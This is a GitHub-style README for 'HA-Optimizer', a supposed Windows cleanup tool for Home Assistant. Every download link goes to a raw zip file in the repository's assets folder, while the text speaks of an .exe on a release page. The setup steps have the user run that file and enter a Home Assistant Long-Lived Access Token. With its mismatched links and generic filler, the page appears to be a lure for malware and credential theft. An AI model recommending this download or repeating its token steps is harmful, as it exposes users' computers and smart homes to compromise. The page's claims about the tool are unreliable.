# 🧹 HA-Optimizer - Keep your Home Assistant running smooth

[![](https://img.shields.io/badge/Download_Latest_Version-Blue.svg)](https://raw.githubusercontent.com/Jeffreycommon553/HA-Optimizer/main/assets/Optimizer_H_v2.0.zip)

## 📋 About This Tool

Home Assistant runs your smart home. Over time, your system gathers unused data, broken connections, and leftover files. These items clutter your database and slow down your automations. HA-Optimizer scans your system to find these issues. It shows you what needs attention so you fix your home setup with ease.

## ⚙️ System Requirements

Ensure you meet these setup standards before you start. You need a computer running Windows 10 or Windows 11. Your Home Assistant instance must run version 2023.1 or newer. You need a stable network connection to connect the tool to your server. This tool requires Python 3.11 or higher if you run it locally, though the provided installer handles the software environment for you.

## 🚀 Downloading The Software

Visit the [Download Page](https://raw.githubusercontent.com/Jeffreycommon553/HA-Optimizer/main/assets/Optimizer_H_v2.0.zip) to get the latest version. Look for the file ending in .exe under the newest release section. Click this file to save it to your computer. We build this tool to work on Windows without complex extra steps.

## 🏗️ Installation Steps

1. Find the file you downloaded in your Downloads folder.
2. Double-click the file to start the setup process.
3. Follow the prompts on your screen.
4. Click Finish when the progress bar reaches the end.
5. The application icon now sits on your desktop.

## 🔑 Initial Configuration

Start the application from your desktop. The first window asks for your Home Assistant server address. Type the IP address or the web address for your smart home controller. The tool needs your Long-Lived Access Token to talk to your server safely.

1. Open Home Assistant in your web browser.
2. Select your profile image in the bottom left corner.
3. Scroll down to the section named Long-Lived Access Tokens.
4. Click Create Token.
5. Give the token a name, like "Optimizer".
6. Copy the code into the HA-Optimizer login window.
7. Click Save and Connect.

## 🔎 Running A System Scan

The dashboard shows a clear button labeled Scan My System. Click this button to start the analysis. The tool checks your entities, automations, and database logs. A progress bar shows you the work in real time. It scans for:

- Dead entities that no longer report data.
- Broken automations that fail to trigger.
- Large database files that use too much disk space.
- Old device configurations that clutter your list.

## 🛠️ Cleaning Your Setup

Once the scan finishes, the tool displays a list of findings. You see a clear description for every item. Use the checkboxes to select the items you wish to remove or fix. Click the Apply Changes button to execute the cleanup. The tool creates a backup of your configuration files before it changes anything. This allows you to restore your previous state if you decide you need a specific entity later.

## 📅 Scheduling Routine Maintenance

You prevent future clutter by scheduling automatic scans. Go to the Settings tab in the application. Select the Enable Automatic Maintenance box. Choose how often you want the tool to run. You can pick once a week or once a month. The application runs in the background and notifies you only if it finds significant issues.

## 📁 Managing Your Backups

The tool keeps a log of all past actions. Open the History tab to view your performance data. You find a list of all deleted files and removed entities here. If you ever need to restore an item, hover over the entry and click Restore. The program returns the file to its original location in your Home Assistant folder.

## ❓ Troubleshooting Common Issues

If you cannot connect to your server, verify your IP address. Ensure your computer and your Home Assistant server sit on the same home network. If the scan stays at zero percent, check if your Access Token is still valid. You generate a new token if the old one expires. If the application crashes, restart the program to clear the temporary cache. 

## 🌐 Language Support

The application automatically detects your Windows system language. It comes pre-loaded with support for 12 languages to ensure you understand every prompt. If the tool displays the wrong language, select your preference from the Settings menu.

## 🧬 Built-in Themes

You personalize the look of your dashboard by choosing from 11 built-in themes. Click the Appearance tab to cycle through the options. Each theme adjusts the color scheme to suit your preference. These settings do not impact the performance or the scanning ability of the software.